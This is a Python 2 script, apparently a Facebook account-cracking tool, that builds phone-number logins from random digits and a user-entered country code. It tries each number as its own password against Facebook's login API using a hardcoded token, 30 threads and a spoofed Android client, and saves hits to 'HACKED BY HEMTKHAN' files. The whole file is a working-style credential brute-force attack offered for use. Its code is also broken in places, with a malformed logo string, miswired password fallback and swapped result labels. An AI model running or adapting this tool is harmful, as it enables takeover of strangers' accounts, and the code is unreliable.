import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(100000):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 af.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = """


##     ## ######## ##     ##    ###    ######## 
##     ## ##       ###   ###   ## ##      ##    
##     ## ##       #### ####  ##   ##     ##    
######### ######   ## ### ## ##     ##    ##    
##     ## ##       ##     ## #########    ##    
##     ## ##       ##     ## ##     ##    ##    
##     ## ######## ##     ## ##     ##    ##    


\x1b[1;92m-------┏───────────────────────────────────────────────────────────┓
\x1b[1;92m-------│❲◍❳ ᴅᴇᴠᴏʟᴏᴘᴇʀ: ᴍʀ.Hemat Khan       │● ɴᴏᴛᴇ:ᴛʜɪs ᴛᴏᴏʟs ɪs Free ●│
\x1b[1;93m-------┠───────────────────────────────╂───────────────────────────┫   
\x1b[1;94m-------│❲◍❳ ɢɪᴛʜᴜʙ   : HEMAT KHAN 𓁋.       │● ᴛʜᴇ ᴋɪɴɢ ᴏғғ ᴘʀᴏɢʀᴀᴍᴍᴇʀ ●│
\x1b[1;95m-------┠───────────────────────────────╂─────────────┯─────────────┫ 
\x1b[1;96m-------│❲◍❳ ғᴀᴄᴇʙᴏᴏᴋ :Hemat Khan│● ● ● ┏──────┷──────┓ ● ● ●│
\x1b[1;97m-------┠───────────────────────────────┫● ● ● │● ᴍʀ.Hemat ●│ ● ● ●│ 
\x1b[1;95m-------│❲◍❳ ᴡʜᴀᴛsᴀᴘᴘ : nadarom  │● ● ● ┗─────────────┛ ● ● ●│
\x1b[1;91m-------┠───────────────────────────────┷───────┯───────────────────┫
\x1b[1;92m-------│❲◍❳ ᴛᴇʟᴇɢʀᴀᴍ : @HemtHack             │● ᴛʜᴀɴᴋs ᴇᴠᴇʀʏᴏɴᴇ ●│
\x1b[1;93m-------┗───────────────────────────────────────┷───────────────────┛""")





 
 

"""
back = 0
successful = []
cpb = []
oks = []
id = []

def Cybery():
    os.system('clear')
    print logo
    print 42 * '~'
    print '  [1] CRACK  ALL Country  WITH NUMBERS '
    print 42 * '~'
    Ali()


def Ali():
    global cpb
    global oks
    bch = raw_input(' ENTER NUMBER >> 1 << ')
    if bch == '':
        print '[!] Fill in correctly'
        Ali()
    elif bch == '1':
        os.system('clear')
        print logo
        print '  HACK ALL COUNTRY FB '
        try:
            k = raw_input(' Enter Country Code : ')
            c = raw_input(' Enter Range Code ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            Ali ()

    elif bch == '0':
        exb()
    else:
        print '[!] Not Funds Files'
        Ali()
    xxx = str(len(id))
    psb(' TOTAL   NUMBERS: ' + xxx)
    time.sleep(0.1)
    psb(' PLEAS WHIT...')
    time.sleep(0.5)
    print 40 * '~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + '  no ' + pass1 + '\n' + '\n'
                okb = open('save/ HACKED BY HEMTKHAN  .txt', 'a')
                okb.write(k + c + user + '   ' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92mHACKED BY HEMTKHAN\x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '   ' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
             	pass2 ="100200"
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + '  NO  ' + pass1 + '\n' + '\n'
                okb = open('save/ HACKED BY HEMTKHAN  .txt', 'a')
                okb.write(k + c + user + '   ' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92mHACKED BY HEMTKHAN \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '    ' + pass2 + '\n')
                cps.close()
                cpb.append(c + user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;91m='
    print '[\xe2\x9c\x93]\x1b[1;93m Process Has Been Completed ....'
    print '[\xe2\x9c\x93]\x1b[1;92m Total successfull/\x1b[1;96mcheckpoint : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')


if __name__ == '__main__':
    Cybery()
